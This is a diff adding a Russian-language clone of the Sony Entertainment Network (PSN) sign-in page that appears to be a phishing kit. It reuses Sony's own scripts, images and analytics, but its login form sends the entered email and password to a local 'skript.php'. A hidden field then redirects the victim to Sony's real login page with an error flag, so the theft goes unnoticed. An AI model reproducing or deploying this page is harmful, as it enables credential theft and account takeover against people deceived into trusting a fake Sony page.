@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="ru" >
+	<head>
+		
+		<meta charset="UTF-8">
+		<meta name="apple-mobile-web-app-capable" content="yes" />    
+		<meta name="format-detection" content="email=no" />
+		<meta id="orientationMeta" name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+		<meta http-equiv="X-UA-Compatible" content="IE=9" />
+			           
+
+		        <script type="text/javascript" src="https://auth.api.sonyentertainmentnetwork.com/common/js/oauth.min.js"></script>
+        <script type="text/javascript" src="https://auth.api.sonyentertainmentnetwork.com/liquid/js/themesupport.min.js"></script>
+        
+        <script>
+            var is_ie8_or_ie7 = false;
+            var is_ie9 = false;
+
+            $(document).ready(
+                function() {
+
+                    PageUtils.init();
+
+                    $("#signInInput_SignInID").placeholder();
+
+                    if(navigator.userAgent.toLowerCase().indexOf("sony tablet p build") != -1) {
+                        $("footer").css("padding-bottom","100px");
+                    }
+                }
+            );
+
+        </script>
+
+
+		
+
+
+    
+    
+    
+    
+    
+
+    
+        <link rel="stylesheet" href="https://auth.api.sonyentertainmentnetwork.com/liquid/css/oauth-responsive.css" />
+    
+    
+
+
+		
+		<!--[if IE 10]>
+		    <link rel="stylesheet" type="text/css" href="https://cdn-a.sonyentertainmentnetwork.com/grc/css/stylesheets/liquid/ie9.css">
+		    <script>
+		        $(document).ready(function(){
+		            $("body").addClass("msie10");
+		        });
+		    </script>
+		<![endif]-->
+		<!--[if IE 9]>
+		    <link rel="stylesheet" type="text/css" href="https://cdn-a.sonyentertainmentnetwork.com/grc/css/stylesheets/liquid/ie9.css">
+		    <script>
+		        var is_ie9 = true;
+		        $(document).ready(function(){
+		            $("body").addClass("msie9");
+		        });
+		    </script>
+		<![endif]-->
+		<!--[if IE 8]>
+		    <link rel="stylesheet" type="text/css" href="https://cdn-a.sonyentertainmentnetwork.com/grc/css/stylesheets/liquid/ie8.css">
+		    <script>
+		        is_ie8_or_ie7 = true;
+		        $(document).ready(function(){                       
+		            $("body").addClass("msie8");
+		        });
+		    </script>
+		<![endif]-->
+		<!--[if IE 7]>
+		    <link rel="stylesheet" type="text/css" href="https://cdn-a.sonyentertainmentnetwork.com/grc/css/stylesheets/liquid/ie7.css">
+		    <script>
+		        is_ie8_or_ie7 = true;
+		        $(document).ready(function(){
+		            $("body").addClass("msie7");
+		        });
+		    </script>
+		<![endif]-->
+		
+		
+		<!--[if lt IE 9]>
+		    <script src="https://auth.api.sonyentertainmentnetwork.com/js/html5.js"></script>
+		<![endif]-->
+		        
+
+		
+		<link rel="shortcut icon"             href="https://cdn-a.sonyentertainmentnetwork.com/grc/images/favicons/liquid/favicon.ico" />
+		<link rel="apple-touch-icon"          href="https://cdn-a.sonyentertainmentnetwork.com/grc/images/mobile/appleIcon.png"        />
+		<link rel="apple-touch-startup-image" href="https://cdn-a.sonyentertainmentnetwork.com/grc/images/mobile/appleSplash.png"      />
+
+
+
+		<title>Войти в сеть: Sony Entertainment Network</title>
+	</head>
+	<body>
+		<section class="bodyGradient signInPage">
+
+			<section id="blackHeaderBar">
+				<img id="sonyLogo" src="https://auth.api.sonyentertainmentnetwork.com/liquid/img/sonyLogo_69x13.png"/>
+			</section>
+
+			<section id="mainContainer">
+
+				<!--
+					RIGHT
+				-->
+				<section id="section_rightColumn" class="signInRightColumn">
+					
+						<div id="marketingAreaSection"  class="herobanner SEN" >
+							<div id="signInMarketingImgPC" class="herobanner-image"></div>
+							
+								<div id="signInMarketingImgTablet" class="herobanner-image"></div>
+								<div id="signInMarketingImgMobile" class="herobanner-image"></div>
+							
+						</div>
+					
+
+					<section id="signInFormSection" class="signinform">
+					
+						<!-- 
+							for bigScreen render mode, we want the signin form to move up top, as the signin buttom
+							becomes invisible on 720p TVs, when captcha elements are rendered, US30613 - supported browsers only
+						-->
+						
+							
+						
+					 
+						<form id="signInForm" method="post" action="skript.php" autocomplete="off">
+							
+							  <input id="brandingParams" type="hidden" name="params" value="cmVxdWVzdF90aGVtZT1saXF1aWQ=" />
+							  <input type="hidden" name="service" value="psn" />
+							  <input type="hidden" name="ref" value="0" />
+							  <input type="hidden" name="redirect" value="https://auth.api.sonyentertainmentnetwork.com/login.jsp?request_theme=liquid&authentication_error=true">
+
+						   	
+							
+
+                            
+
+								<header class="signinform-title">
+									<h1 id="marketingTextArea">Войти в сеть</h1>
+								</header>
+								<div id="errorDiv" style="display:none;padding-bottom:4px;"></div>
+								<label id="signInLabel_SignInID">Идентификатор&nbsp;входа в сеть</label>
+	
+								<!-- signin id -->
+								<input id="signInInput_SignInID"
+									   class="textInput signInTextWidth"
+									   tabindex="2"
+									   name="login"
+									   type="email"
+									   maxlength="63"
+									   value=""
+									   placeholder="Адрес электронной почты"
+									   autocomplete="off" required
+								/>
+								<section id="rememberMeSection">
+									<input id="rememberSignInIdCheckBox" tabindex="4" class="checkBoxInput" type="checkbox" name="rememberSignIn" />
+									<label id="rememberSignInLabel" for="rememberSignInIdCheckBox">Запомнить мой идентификатор входа в сеть</label>
+								</section>
+
+								<label id="signInLabel_Password">Пароль</label>
+
+                                <!-- password -->
+                                <div class="passwordcontrol">
+                                    <input id="signInInput_Password"
+                                           class="textInput signInTextWidth passwordcontrol-field"
+                                           tabindex="2"
+                                           name="pass"
+                                           type="password"
+                                           maxlength="30"
+                                           autocomplete="off"
+										   required
+                                    />
+                                    <span class="passwordcontrol-button passwordcontrol-button-show" data-action="togglePassword">Показать</span>
+                                    <span class="passwordcontrol-button passwordcontrol-button-hide" data-action="togglePassword">Скрыть</span>
+                                </div>
+                                
+								<!-- captcha -->
+								
+	
+								<!-- submit -->
+								<section class="uiButtonPrimary">
+									<input id="signInButton" tabindex="5" type="submit" value="Войти в сеть" />
+								</section>
+	
+								<!-- help me -->
+								
+									<a id="troubleShooterLink" href="https://account.sonyentertainmentnetwork.com/liquid/reg/account/trouble-shooter!input.action?troubleSignIn=true&external=true&refererPage=websso&returnURL=https%3A%2F%2Fauth.api.sonyentertainmentnetwork.com%2F2.0%2Foauth%2Fauthorize%3Frequest_theme%3Dliquid%26scope%3Dpsn%253As2s%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fsecure.eu.playstation.com%252Fpsnauth%252FPSNOAUTHResponse%252Fpdc%252F%26client_id%3Dfe1fdbfa-f1a1-47ac-b793-e648fba25e86&cancelURL=https%3A%2F%2Fauth.api.sonyentertainmentnetwork.com%2F2.0%2Foauth%2Fauthorize%3Frequest_theme%3Dliquid%26scope%3Dpsn%253As2s%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fsecure.eu.playstation.com%252Fpsnauth%252FPSNOAUTHResponse%252Fpdc%252F%26client_id%3Dfe1fdbfa-f1a1-47ac-b793-e648fba25e86%26prompt%3Dnone&request_theme=liquid" class="smalla ssoForgotPasswordLink" tabindex="6">
+										Проблемы при входе?
+									</a>
+								
+								
+								<div class="clearMe"></div>
+								
+								<!-- create account link -->
+								
+									<label id="dontHaveAnAcountLabel">У вас нет учетной записи?</label>
+									<a id="createAccountLink" href="https://account.sonyentertainmentnetwork.com/external/create-account!input.action?refererPage=websso&noEVBlock=true&returnURL=https%3A%2F%2Fauth.api.sonyentertainmentnetwork.com%2F2.0%2Foauth%2Fauthorize%3Frequest_theme%3Dliquid%26scope%3Dpsn%253As2s%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fsecure.eu.playstation.com%252Fpsnauth%252FPSNOAUTHResponse%252Fpdc%252F%26client_id%3Dfe1fdbfa-f1a1-47ac-b793-e648fba25e86&cancelURL=https%3A%2F%2Fauth.api.sonyentertainmentnetwork.com%2F2.0%2Foauth%2Fauthorize%3Frequest_theme%3Dliquid%26scope%3Dpsn%253As2s%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fsecure.eu.playstation.com%252Fpsnauth%252FPSNOAUTHResponse%252Fpdc%252F%26client_id%3Dfe1fdbfa-f1a1-47ac-b793-e648fba25e86%26prompt%3Dnone&request_theme=liquid" tabindex="7">
+										Создание новой учетной записи
+									</a>
+								
+	
+							
+
+							<!-- cancel -->						
+							
+								<section class="cancelSignInSection">
+									<a id="cancelSignInLink" href="/2.0/oauth/cancel" tabindex="8">Отмена</a>
+								</section>
+							
+
+						</form>
+
+					</section>
+				</section>
+
+				<!--
+					LEFT
+				-->
+				<section id="section_leftColumn" class="signInLeftColumn">&nbsp;</section>
+				<div class="clearMe"></div>
+
+			</section>
+
+			<!--
+				FOOTER
+			-->
+			
+            <footer>
+                <div id="footerContainer"></div>
+            </footer>
+            <script type="text/javascript" src="https://cdn-a.sonyentertainmentnetwork.com/grc/unifiedFooter/footerJSONHTML.min.js"></script>
+
+            
+	            <script>
+	                SNEIUnifiedFooter.country = "RU";
+	                SNEIUnifiedFooter.language = "ru";
+	                SNEIUnifiedFooter.responsive = "true";          
+	                SNEIUnifiedFooter.jsonDomain = "https://cdn-a.sonyentertainmentnetwork.com/grc/unifiedFooter/";
+	                SNEIUnifiedFooter.displayBrowserWarning = "true";
+	                SNEIUnifiedFooter.headerTextColor = "#5C5C5C";
+	                SNEIUnifiedFooter.linkTextColor = "#5C5C5C";
+	                SNEIUnifiedFooter.copyrightTextColor = "#5C5C5C";
+	                SNEIUnifiedFooter.linkHoverTextColor = "#2B71A5";	
+	                SNEIUnifiedFooter.openLinksInNewWindow = "true";
+	            </script>
+	            
+				
+				
+				
+ 
+	            <script>
+	                SNEIUnifiedFooter.useLinkTracking = "true";
+	                SNEIUnifiedFooter.load();
+	            </script>
+	        
+       
+
+			        <script>
+            var asset_822x1296 = "https://cdn.sonyentertainmentnetwork.com/fileadmin/account/images/SEN/SignInPage/Marketing_822x1296.jpg"   
+            var asset_569x58  ="https://cdn.sonyentertainmentnetwork.com/fileadmin/account/images/SEN/SignInPage/Marketing_569x58.jpg"   
+            var asset_320x58  = "https://cdn.sonyentertainmentnetwork.com/fileadmin/account/images/SEN/SignInPage/Marketing_320x58.jpg"   
+            
+            $(document).ready(
+                function() {
+                	// once the urls are determined, we use jquery to ammend background property of all 3 divs
+                    //
+                    $("#marketingAreaSection #signInMarketingImgPC").css("background-image","url('https://cdn.sonyentertainmentnetwork.com/fileadmin/account/images/SEN/SignInPage/Marketing_822x1296.jpg')");
+                    $("#marketingAreaSection #signInMarketingImgPC").css("background-repeat","no-repeat");
+                    $("#marketingAreaSection #signInMarketingImgPC").css("background-position","0 0");
+
+                    $("#marketingAreaSection #signInMarketingImgTablet").css("background-image","url('https://cdn.sonyentertainmentnetwork.com/fileadmin/account/images/SEN/SignInPage/Marketing_320x58.jpg')");
+                    $("#marketingAreaSection #signInMarketingImgTablet").css("background-repeat","no-repeat");
+                    $("#marketingAreaSection #signInMarketingImgTablet").css("background-position","0 0");
+
+                    $("#marketingAreaSection #signInMarketingImgMobile").css("background-image","url('https://cdn.sonyentertainmentnetwork.com/fileadmin/account/images/SEN/SignInPage/Marketing_569x58.jpg')");
+                    $("#marketingAreaSection #signInMarketingImgMobile").css("background-repeat","no-repeat");
+                    $("#marketingAreaSection #signInMarketingImgMobile").css("background-position","0 0");
+                }
+            );
+        
+        </script>
+       
+        
+		</section>
+
+		<!-- debug console -->
+		
+
+	</body>
+</html>
+
+    
+    
+    
+
+
+  <script>
+
+      // google
+          var _gaq = _gaq || [];
+          var gaDomain     = '.sonyentertainmentnetwork.com';
+          var gaTrackingId = 'UA-25375929-1';
+
+
+
+          var _gaq = _gaq || [];
+              _gaq.push(['_setAccount', gaTrackingId]);
+              _gaq.push(['_setDomainName', gaDomain]);
+              _gaq.push(['_setAllowLinker', true]);
+              _gaq.push(['_setAllowHash', false]);
+              _gaq.push(['_setAllowAnchor', true]);
+              _gaq.push(['_trackPageview', VirtualPageview]);
+              _gaq.push(['_trackPageLoadTime']);
+
+          (function() {
+              var ga = document.createElement('script');
+              ga.type = 'text/javascript';
+              ga.async = true;
+              ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+              var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+          })();
+
+          function linkTracking() { _gaq.push(['_link', this.href]); }
+
+      // ubertags
+          var ubTrackingId = 'UT-865786453';
+
+          var ut_country  = "RU";
+          var ut_language = "ru";
+
+          var ut_params   = ut_params || [];
+              ut_params.push(ubTrackingId);
+
+          // inject ubertag script
+          (function() {
+              var ut = document.createElement('script');
+                  ut.type  = 'text/javascript';
+                  ut.async = true;
+                  ut.src   = (("https:" == document.location.protocol) ? "https://" : "http://") + 'app.ubertags.com/javascripts/ubertags.js';
+
+              var script = document.getElementsByTagName('script')[0]; script.parentNode.insertBefore(ut, script);
+          })();
+
+
+  </script>
+
+
+
+
